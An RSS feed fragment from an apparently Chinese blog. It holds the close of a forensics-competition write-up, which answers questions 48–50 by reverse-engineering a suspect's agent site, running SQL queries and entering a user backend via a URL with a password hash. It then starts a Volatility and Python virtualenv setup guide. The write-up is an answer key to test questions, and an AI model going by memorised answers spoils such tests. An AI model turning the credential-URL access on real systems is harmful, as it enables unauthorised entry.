&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2829
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;48重构该网站该嫌疑人下属代理liyun10账户下的余额有多少元&#34;&gt;48.重构该网站，该嫌疑人下属代理&amp;quot;liyun10&amp;quot;账户下的余额有多少元
&lt;/h2&gt;&lt;p&gt;点击结算管理，显示出了余额，说明我们页面没有找错：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726124953712&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726124953712.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726124953712.png&#34; alt=&#34;image-20250726124953712&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;找到对应aspx文件，找dll，逆向：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726125132344&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726125132344.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726125132344.png&#34; alt=&#34;image-20250726125132344&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;很奇怪，这里竟然什么逻辑也没有，猜测是继承的父类&lt;code&gt;Page_zhye&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这里唯一一个非系统库就是&lt;code&gt;RootDPage&lt;/code&gt;，同样在检材3里面找到导出逆向&lt;/p&gt;
&lt;p&gt;果然，里面写出了完整的余额查询逻辑，而所有数据来源都是&lt;code&gt;MInfo&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726125423117&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726125423117.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726125423117.png&#34; alt=&#34;image-20250726125423117&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;这个函数也来自&lt;code&gt;WBus&lt;/code&gt;，里面调用的是数据库中间处理函数&lt;code&gt;PD_MInfo&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726125600012&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726125600012.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726125600012.png&#34; alt=&#34;image-20250726125600012&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;在数据库找到&lt;code&gt;PD_MInfo&lt;/code&gt;这个函数：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726125717692&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726125717692.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726125717692.png&#34; alt=&#34;image-20250726125717692&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;这个查询里面涉及了很多张表，一一查看&lt;/p&gt;
&lt;p&gt;最终，在&lt;code&gt;TD_MJiFen&lt;/code&gt;里面能找到一条数据，id就是我们登录的账号&lt;code&gt;liwente1314520&lt;/code&gt;的，余额也对应：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726125848165&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726125848165.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726125848165.png&#34; alt=&#34;image-20250726125848165&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;可是除此之外再也找不到其他的用户了，这是怎么回事？&lt;/p&gt;
&lt;p&gt;之前我们有使用到过用户表，是&lt;code&gt;TU&lt;/code&gt;开头，而这个表是&lt;code&gt;TD&lt;/code&gt;开头，那么用户是否也有一张一样的表呢？&lt;/p&gt;
&lt;p&gt;果然，我们找到了&lt;code&gt;TU_MJiFen&lt;/code&gt;表！&lt;/p&gt;
&lt;p&gt;这个里面记录的就是所有用户的余额等信息，根据&lt;code&gt;TD_MJiFen&lt;/code&gt;表，&lt;code&gt;_JiFen&lt;/code&gt;字段就是真正的余额：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726130418048&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726130418048.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726130418048.png&#34; alt=&#34;image-20250726130418048&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;同样的，我们还能找到对应的&lt;code&gt;PU_MInfo&lt;/code&gt;函数：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726131348136&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726131348136.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726131348136.png&#34; alt=&#34;image-20250726131348136&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;TU_User&lt;/code&gt;表里面，我们能找到&lt;code&gt;liyun10&lt;/code&gt;对应的id是&lt;code&gt;1049&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726130533004&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726130533004.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726130533004.png&#34; alt=&#34;image-20250726130533004&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;根据之前的&lt;code&gt;PU_MInfo&lt;/code&gt;函数，它比对的是&lt;code&gt;UMJF_UU_ID&lt;/code&gt;，也就是说在这个字段找&lt;code&gt;1049&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726130744630&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726130744630.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726130744630.png&#34; alt=&#34;image-20250726130744630&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;或者直接使用sql语句查询：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;UMJF_JiFen&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TU_MJiFen&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;join&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TU_User&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;on&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;UMJF_UU_Id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;UU_Id&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;where&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;UU_Ln&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;liyun10&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726131737149&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726131737149.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726131737149.png&#34; alt=&#34;image-20250726131737149&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;这就得到了&lt;code&gt;liyun10&lt;/code&gt;的余额&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;不过这种方法太过麻烦，而且有一定的运气因素，万一猜错了表名什么的就完蛋了&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;换一种方式，在用户列表里面直接找到&lt;code&gt;liyun10&lt;/code&gt;，进入后台：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726123147074&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726123147074.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726123147074.png&#34; alt=&#34;image-20250726123147074&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;直接访问是失败的：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726123255986&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726123255986.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726123255986.png&#34; alt=&#34;image-20250726123255986&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;在前面加上服务器ip，就能自动跳转到用户后台管理了：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;192.168.1.176/res/aspx/uin.aspx?user=liyun10&amp;amp;pwd=F58249F4A628AE7B35753EA8416BA943&amp;amp;t=fqgl
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在结算管理里面找到余额：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726123420385&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726123420385.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726123420385.png&#34; alt=&#34;image-20250726123420385&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1066449
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其实做到这里也就知道为什么之前的方法不能直接找到用户余额表了，因为之前登录的管理员账号使用的结算管理页面.aspx文件和用户使用的不一样，我直接找只能找到管理（？的余额，总之不是liyun10的&lt;/p&gt;
&lt;p&gt;另外，直接看数据库余额是有小数部分的，但是答案格式只说是&amp;quot;123456&amp;quot;这样的纯数字，不知道会不会有冲突&lt;/p&gt;
&lt;h2 id=&#34;49接上一题该用户的推广id是&#34;&gt;49.接上一题，该用户的推广ID是
&lt;/h2&gt;&lt;p&gt;链接代码中能看见：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726123946116&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726123946116.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726123946116.png&#34; alt=&#34;image-20250726123946116&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d0fdd7a9a010d37e
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;50接上一题该代理商户的最后一次登陆时间是&#34;&gt;50.接上一题，该代理商户的最后一次登陆时间是
&lt;/h2&gt;&lt;p&gt;登录日志里面啥也没有，注册信息里面倒是有：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726124102502&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726124102502.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726124102502.png&#34; alt=&#34;image-20250726124102502&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2016/9/5 17:09:13
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;总算是做完了，part4真的是异常的艰难啊&lt;/p&gt;
</description>
        </item>
        <item>
        <title>volatility使用说明</title>
        <link>https://blog.928330.xyz/p/volatility%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/</link>
        <pubDate>Mon, 21 Jul 2025 12:51:01 +0800</pubDate>
        
        <guid>https://blog.928330.xyz/p/volatility%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/</guid>
        <description>&lt;img src="http://picture.928330.xyz/typora/1pgvz3h0o0wydnqs6q91v9w.jpg" alt="Featured image of post volatility使用说明" /&gt;&lt;h1 id=&#34;前置步骤问题解决&#34;&gt;前置步骤/问题解决
&lt;/h1&gt;&lt;h2 id=&#34;下载&#34;&gt;下载
&lt;/h2&gt;&lt;p&gt;Volatility2：https://github.com/volatilityfoundation/volatility&lt;/p&gt;
&lt;p&gt;Volatility3：https://github.com/volatilityfoundation/volatility3&lt;/p&gt;
&lt;h2 id=&#34;python版本&#34;&gt;python版本
&lt;/h2&gt;&lt;p&gt;update-alternatives是Debian/Ubuntu系统提供的管理系统级默认命令的工具，通过维护符号链接工作&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;设置优先级，一般使用整数：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;update-alternatives --install /usr/bin/python python /usr/bin/python2 &lt;span style=&#34;color:#d19a66&#34;&gt;100&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;update-alternatives --install /usr/bin/python python /usr/bin/python3 &lt;span style=&#34;color:#d19a66&#34;&gt;150&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;查看当前可识别的版本：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; update-alternatives --list python
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/python2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/python3
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/python3.11
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;切换版本：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;update-alternatives --config python
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;有 &lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt; 个候选项可用于替换 python &lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;提供 /usr/bin/python&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt;。
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  选择       路径               优先级  状态
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;------------------------------------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;            /usr/bin/python3      &lt;span style=&#34;color:#d19a66&#34;&gt;150&lt;/span&gt;       自动模式
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;            /usr/bin/python2      &lt;span style=&#34;color:#d19a66&#34;&gt;100&lt;/span&gt;       手动模式
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;            /usr/bin/python3      &lt;span style=&#34;color:#d19a66&#34;&gt;150&lt;/span&gt;       手动模式
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;            /usr/bin/python3.11   &lt;span style=&#34;color:#d19a66&#34;&gt;125&lt;/span&gt;       手动模式
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;要维持当前值&lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt;请按&amp;lt;回车键&amp;gt;，或者键入选择的编号：
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;输入数字切换版本&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;虚拟环境&#34;&gt;虚拟环境
&lt;/h2&gt;&lt;h3 id=&#34;安装&#34;&gt;安装
&lt;/h3&gt;&lt;p&gt;volatility2是基于python2开发的，所以虚拟环境也要使用python2的virtualenv创建&lt;/p&gt;
&lt;p&gt;这里以我下载python2.7版本的虚拟环境步骤为例，记录一些遇到的问题&lt;/p&gt;
&lt;p&gt;首先下载pip2，需要切换到python2的环境，并且由于linux系统大多放弃了apt对python2的支持，所以无法使用apt install下载，需要手动安装&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.下载脚本：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;2.运行脚本：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo python2 get-pip.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;3.检查是否安装成功：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip2 -V
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;成功显示出pip的版本号，以及它关联的是Python 2.7，就说明已经成功为安装好了pip2&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4.安装virtualenv：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;安装的版本必须是兼容python2的，直接安装可能会下载到python3的版本，所以要指定版本：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip2 install &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;virtualenv&amp;lt;20&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;如果是volatility3，也就是基于python3的版本，就可以使用apt直接下载对应的venv工具&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;先更新，后下载：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt update
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt install python3-venv
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样就完成了安装&lt;/p&gt;
&lt;h3 id=&#34;创建&#34;&gt;创建
&lt;/h3&gt;&lt;p&gt;python2：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python2 -m virtualenv 虚拟环境名
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;python3：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 -m venv 虚拟环境名
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;使用&#34;&gt;使用
&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;source 虚拟环境名/bin/activate
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;提示符前面会多一个&lt;code&gt;(虚拟环境名)&lt;/code&gt;的标记，之后的所有python和pip命令都只作用在此环境下&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;分享依赖&#34;&gt;分享依赖
&lt;/h3&gt;&lt;p&gt;这条命令会将当前环境中所有已安装的库及其版本号写入到&lt;code&gt;requirements.txt&lt;/code&gt;中：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;pip freeze &amp;gt; requirements.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果别人需要用，只需创建一个新的虚拟环境，再运行：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;pip install -r requirements.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通常我们也是使用这个命令来下载对应工具需要的依赖&lt;/p&gt;
&lt;h3 id=&#34;退出&#34;&gt;退出
&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;deactivate
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;删除&#34;&gt;删除
&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rm -rf 虚拟环境名
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;设置为系统级命令&#34;&gt;设置为系统级命令
&lt;/h2&gt;&lt;h3 id=&#34;编写启动脚本&#34;&gt;编写启动脚本
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vim /usr/local/bin/vol
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;向里面写入下面内容：&lt;/p&gt;
